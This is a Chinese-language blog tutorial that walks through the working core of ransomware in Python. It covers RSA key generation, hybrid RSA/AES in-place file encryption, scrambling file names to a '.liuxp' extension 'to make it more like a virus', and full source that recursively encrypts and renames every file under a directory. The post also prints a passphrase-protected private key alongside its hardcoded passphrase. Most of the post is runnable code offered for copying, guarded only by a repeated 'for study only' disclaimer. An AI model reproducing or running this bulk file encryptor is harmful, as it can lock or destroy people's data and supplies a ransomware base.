---
title: 使用Python加密文件
date: 2023-04-17 22:03:13
categories: 技术
tags:
    - python
---

### 功能

用Python实现对文件的加密和解密，即ransomware的代码原理实现。

### 序

如果你是直接copy的代码块，粘贴到pycharm后，你会看到.py文件会有一些导入包的报错。你可以自己去网上找教程进行下载。<!-- more -->比如[这个](https://blog.csdn.net/yilovexing/article/details/104011199)，也可以下载[我提供的文件](https://www.aliyundrive.com/s/HcrQHfdUYMi)，然后把下载两个文件夹复制到Python环境的`F:\Python\Lib\site-packages\`文件夹下面（我的Python安装在F盘，找到你自己的安装路径），这个文件夹保存了一些Python导的包。如果是自己下载的，下载完之后还是报错，也可以到这个文件夹下，检查一下Python中导包时from XXX和下载到这个文件夹的包命大小写是否一致。再有别的问题，也只能你自己去探索了。我百分之百确定，这个代码是可以运行成功的。我用的Python版本是3.11.2。

### 秘钥生成

准备好环境之后，那么我们现在来开始模拟hacker对文件进行加密处理吧！！

如果前面有了解RSA算法的话，那么肯定知道，我们第一步就是要生成公钥和私钥，用公钥对文件进行加密，用私钥对文件进行解密。

```bash 折叠代码
from Crypto.PublicKey import RSA


def CreateRSAKeys():
    code = 'nooneknows'
    # 生成 2048 位的 RSA 密钥
    key = RSA.generate(2048)
    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection="scryptAndAES128-CBC")
    # 生成私钥
    with open('zmy_rsa', 'wb') as f:
        f.write(encrypted_key)
    # 生成公钥
    with open('zmy_rsa.pub', 'wb') as f:
        f.write(key.publickey().exportKey())


CreateRSAKeys()

```

当我们执行CreateRSAKeys()后，会在当前目录生成公钥和私钥，我们打开看看。

公钥：

```bash
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0j/abkXy6WLfwkacyKK3
40Sk0dQkODmb6ej5sffzkfgSDOd18drt6vWuqzcH0dtBHcbr8a35K8mLr9WwdKYC
hDj/dMQm+lOApmLmGeSwjoFB5Nj/tboBPRvPO0erxzS0jrtMdM6KbWjQMc4dkuuq
Ic/L6/Yp5l2mq3K3rdbkbZ8cKvJb5HCUeNiwNZQMTdxFd0R0qmVzezJdunFQAOiP
G8Knod/Z1ZghETOEuM2OPXxlRs0KA9OQhMFRS6UmCRRNv29/srT/+M307W0U9GJL
3Eobz6HqTlvl0g54Y9Dg84UO2t2VRgAZ3mlQa+bARyboOQwWpt3VZ7y44KqTwj90
UQIDAQAB
-----END PUBLIC KEY-----
```

私钥：

```bash 折叠代码
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFJTBPBgkqhkiG9w0BBQ0wQjAhBgkrBgEEAdpHBAswFAQIYFPAcEnz9NUCAkAA
AgEIAgEBMB0GCWCGSAFlAwQBAgQQV9WQuQ24VS4bv3+pL+lm3ASCBNBw9SW3QVpT
IgTS6uoi7HqXmI1eJW2YTz+SxPxQbTaS0fSPG21JoumOqYIzNoQ970fefOPiwiNB
UuW46O9y/lGq3plisy9rKxmFNxjos5Dk3BBM/mOEAc5FS9i/PfKkExgCsIZ9eLpi
wYt3n1myGJifopjmbjYd6ztHs+wOfyVtid87f+gYusSXk3Ne4Yn2FXqSOL3qKBTa
PVB/Go/DfT3d50OghNC2x2WpVb69dXH68KqEIQEmCEU9QR9efOyD8DzggWMAPdAR
1qJpSGIAtAf/vFV4QG+eFtZanzg3PywoRHkEaLo5CJbQb0K/5QaLFM7SE4iHecAI
TZAepi92T1bCa0eyDUFf/RU0mgISrwzfpDzrxgnXjP3ksmLPDrCocXn2Kenvrnqv
mrHwh3d4Y8qoCGEwtPuc3t1N5nNq7cd1BWhtt1E/scAp3B4pg6f3hPuWApXKzGwK
1ru6RJrZ/yhvMTsXX7fASpKnUcJw20fOl5jqsNae0GufZnRTmEwjXzh5uyh7oKYx
ha2OycJWcaZTm6Yo6h7OfAAZfvWgT0sSg7q2Rw/v13laxAZFHlWwLek1L9vtOjXM
RU/WSJxksg42WUWlL1EOF+GYsX5hwXEGpHNLJmkbeAWblx7xYvlYkkognhbAG/Pe
2QJwbbhfFmQO3NSj8usT+3f0YpPodPXvprk6qosLnhPBjK/NYxYuI/PsRME6Jm02
vQWgSB34vPS2NtxEt2WEtRSGAgwsLPo1U8GaGLLe5DCbXUbbm01/rd24VqY4I3fk
hY8tw6V5PmBvJ3RlD4Q7xSdHTQnU05sDBg3WJ+gU4uNMYQxzs/2UxyRJfd7gHwt8
J4enD1ch0G1v5KeXRJNj2AatL8U3oSqm+4ZPzT/riRLB485yCljUwxFK18O2Rgy3
purKYfk3Vh+M4UTVdmvOlNzaY7ll/kKGAeIz1CMBiyBDm3n0GOrTUT+UtMKgib6V
XP6fVZ3A33oa2+cbaRX+4inShyNFly+FTjebHZ3qOBoKv9yJ2ZkeSwWhocpfZyG1
LBidZFC6cKlzAuOalKAnk+FpkNAms7VBppjSZUiULqOdFbiJREN8tlVumQh4rNkm
ehaHywx1KYQxhi1wKoD5eqKhgjiIdGja9ojxXbS1QMZJhz5W7/uSvfLxXQrL4F6T
ZxwdF+w85+SJQq6d4MmLjyIDbdivsNg+m1t3kiaRRcVgBotFgT0qLVdqmB/Townt
aYnDBCJ6EgnWSGwNMqMOR9wwIp9x01UbMpM8r86DDmQlLKDh+oqi4WAdYoAgAt+5
7Wwb45GsrgaX6YrQ42W364wsYsJSLkcrx2XuL221pZgm4wCxrKQ0LvpJ3zkrKLLF
IiB2UEpKG02MmBHpUktS0P9WE3uLg11LlGMAjY785EcU5is8RIiJwWmsw31mI1aV
/RXEdAk//2796uxxOjqoEYfieeIW8qlfiBRkxDRTqaFxlPqGm6HGs3xxIsKkylWX
AjvyWUObRYcu8iujiCnOpCLiYUtfkxomiw0xl6hyqyLeVe0Vf6f/cTEKYRDfUpVS
+Znqj5IfgE/7mqDl2rjH8SnsvBb2BMK/kMGjPuOIDFfbaXy+s9f9bGH6I/g2D57W
G5V6ZnooEecwqjFhZ1xHKMtvDcPAO0ivEw==
-----END ENCRYPTED PRIVATE KEY-----
```

当然每次运行的结果都不一定，公钥是公开的，任何人都可以看到，但是私钥一定要保存好，否则一旦泄露，意味着你的信息也不安全了。

### 文件加密

现在我们来看看如何对文件进行加密处理：

```bash 折叠代码
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes


def Encrypt(filename):
    data = ''
    # 二进制只读打开文件，读取文件数据
    with open(filename, 'rb') as f:
        data = f.read()
    with open(filename, 'wb') as out_file:
        # 收件人秘钥 - 公钥
        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())
        # 一个 16 字节的会话密钥
        session_key = get_random_bytes(16)
        # Encrypt the session key with the public RSA key
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        out_file.write(cipher_rsa.encrypt(session_key))
        # Encrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX)

        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
        out_file.write(cipher_aes.nonce)
        out_file.write(tag)
        out_file.write(ciphertext)


Encrypt("e://test/music.mp3")

```

我们打开一个文件用于写入数据。接着我们导入公钥赋给一个变量，创建一个 16 字节的会话密钥。在这个例子中，我们将使用混合加密方法，即 PKCS#1 OAEP ，也就是最优非对称加密填充。这允许我们向文件中写入任意长度的数据。接着我们创建 AES 加密，要加密的数据，然后加密数据。我们将得到加密的文本和消息认证码。最后，我们将随机数，消息认证码和加密的文本写入文件。

加密后，这个时候你肯定没有办法按照原来的方式打开你的文件了，或者你能打开，显示的也是乱码。

### 私钥解密

```bash 折叠代码
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP


def Descrypt(filename):
    code = 'nooneknows'
    with open(filename, 'rb') as fobj:
        # 导入私钥
        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)
        # 会话密钥， 随机数，消息认证码，机密的数据
        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)
                                                   for x in (private_key.size_in_bytes(),
                                                             16, 16, -1)]
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)
        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        # 解密
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)

    with open(filename, 'wb') as wobj:
        wobj.write(data)


Descrypt("e://test/music.mp3")

```

我们先以二进制模式读取我们的加密文件，然后导入私钥。注意，当你导私钥时，需要提供一个密码，否则会出现错误。然后，我们文件中读取数据，首先是加密的会话密钥，然后是 16 字节的随机数和 16 字节的消息认证码，最后是剩下的加密的数据。

接下来我们需要解密出会话密钥，重新创建 AES 密钥，然后解密出数据。

解密完成后，我们会发现刚刚打不开或者无法正确显示的文件，又恢复正常了！

### 变更文件名

当然至此，文件加密的部分已经完成，但是为了使这个更像病毒，我们可以模拟hacker的做法，直接把整个文件的后缀名改掉，或者更混蛋一点，我就是想搞破坏，直接把文件名字改成一串没有意义的数值：

举例比如：blog2.rar ==> yFmcuIzZvxmY.liuxp

```bash 折叠代码
import os
import base64


def RenameFile(dir, filename):
    filename_bytes = filename.encode('utf-8')
    filename_bytes_base64 = base64.encodebytes(filename_bytes)

    filename_bytes_base64 = filename_bytes_base64[::-1][1:]  # 倒序
    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'

    # print (new_filename)
    print(os.path.join(dir, filename))
    print(os.path.join(dir, new_filename))
    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))


RenameFile("e:/test/", "cool.png")

```

使用了base64对文件名进行编码。

### 恢复文件名

举例比如: yFmcuIzZvxmY.liuxp ==> blog2.rar

```bash 折叠代码
import os
import base64


def RestoreFilename(dir, filename):
    f = filename
    filename = filename[::-1][6:][::-1]
    filename_base64 = filename[::-1] + '\n'
    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII
    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')
    new_filename = ori_filename

    # print(new_filename)
    print(os.path.join(dir, f))
    print(os.path.join(dir, new_filename))
    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))


RestoreFilename("e://test/", "0hHdu8GbsVGa.liuxp")

```

使用了base64对文件进行解码。

### 完整源码

我们把上述几个过程整合起来，然后实现对某一个目录下的所有文件进行不对称加密和不对称解密：

```bash 折叠代码
# coding=utf-8
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import os
import base64


def CreateRSAKeys():
    code = 'nooneknows'
    key = RSA.generate(2048)
    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection="scryptAndAES128-CBC")
    # 私钥
    with open('zmy_rsa', 'wb') as f:
        f.write(encrypted_key)
    # 公钥
    with open('zmy_rsa.pub', 'wb') as f:
        f.write(key.publickey().exportKey())


def Encrypt(filename):
    data = ''
    with open(filename, 'rb') as f:
        data = f.read()
    with open(filename, 'wb') as out_file:
        # 收件人秘钥 - 公钥
        recipient_key = RSA.import_key(open('zmy_rsa.pub').read())
        session_key = get_random_bytes(16)
        # Encrypt the session key with the public RSA key
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        out_file.write(cipher_rsa.encrypt(session_key))
        # Encrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
        out_file.write(cipher_aes.nonce)
        out_file.write(tag)
        out_file.write(ciphertext)


def Descrypt(filename):
    code = 'nooneknows'
    with open(filename, 'rb') as fobj:
        # 导入私钥
        private_key = RSA.import_key(open('zmy_rsa').read(), passphrase=code)
        # 会话密钥， 随机数，消息认证码，机密的数据
        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)
                                                   for x in (private_key.size_in_bytes(),
                                                             16, 16, -1)]
        cipher_rsa = PKCS1_OAEP.new(private_key)
        session_key = cipher_rsa.decrypt(enc_session_key)
        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
        # 解密
        data = cipher_aes.decrypt_and_verify(ciphertext, tag)

    with open(filename, 'wb') as wobj:
        wobj.write(data)


def RenameFile(dir, filename):
    filename_bytes = filename.encode('utf-8')
    filename_bytes_base64 = base64.encodebytes(filename_bytes)

    filename_bytes_base64 = filename_bytes_base64[::-1][1:]
    new_filename = filename_bytes_base64.decode('utf-8') + '.liuxp'

    # print (new_filename)
    print(os.path.join(dir, filename))
    print(os.path.join(dir, new_filename))
    os.rename(os.path.join(dir, filename), os.path.join(dir, new_filename))


def ReserveFilename(dir, filename):
    f = filename
    filename = filename[::-1][6:][::-1]
    filename_base64 = filename[::-1] + '\n'
    filename_bytes_base64 = filename_base64.encode('ascii')  # encode as ASCII
    ori_filename = base64.decodebytes(filename_bytes_base64).decode('utf-8')
    new_filename = ori_filename

    # print(new_filename)
    print(os.path.join(dir, f))
    print(os.path.join(dir, new_filename))
    os.rename(os.path.join(dir, f), os.path.join(dir, new_filename))


# 解密代码
# def Main(rootDir):
#     list_dirs = os.walk(rootDir)
#     for root, dirs, files in list_dirs:
#         if False:
#             # 遍历文件，加密并且改名
#             for f in files:
#                 filename = os.path.join(root, f)
#                 Encrypt(filename)
#                 RenameFile(root, f)
#         else:
#             # 遍历文件，解密并且恢复名字
#             for f in files:
#                 if f.endswith('.liuxp'):
#                     filename = os.path.join(root, f)
#                     Descrypt(filename)
#                     ReserveFilename(root, f)

# 加密代码
def Main(rootDir):
    list_dirs = os.walk(rootDir)
    for root, dirs, files in list_dirs:
        # 切换加密和解密过程
        # if False:   # 解密文件
        if True:  # 加密文件
            # 遍历文件，加密并且改名
            for f in files:
                filename = os.path.join(root, f)
                Encrypt(filename)
                RenameFile(root, f)
        else:
            # 遍历文件，解密并且恢复名字
            for f in files:
                filename = os.path.join(root, f)
                Descrypt(filename)
                ReserveFilename(root, f)


if __name__ == '__main__':
    # CreateRSAKeys()
    d = "e://test/"
    Main(d)

```

唯一要提到的就是最后的main函数，通过注释if ture 和 if false 切换进行文件的加密和解密，一定要注意代码缩进。

以下是几个实现的效果图：

![加密之前](./Python-encrypted-file/1.png)

![加密之后](./Python-encrypted-file/2.png)

![解密之后](./Python-encrypted-file/3.png)

### 写在后面的话

此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！

此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！

此代码仅作为学习测试使用，前来***学习***的小伙伴还是要遵规守纪啊！！！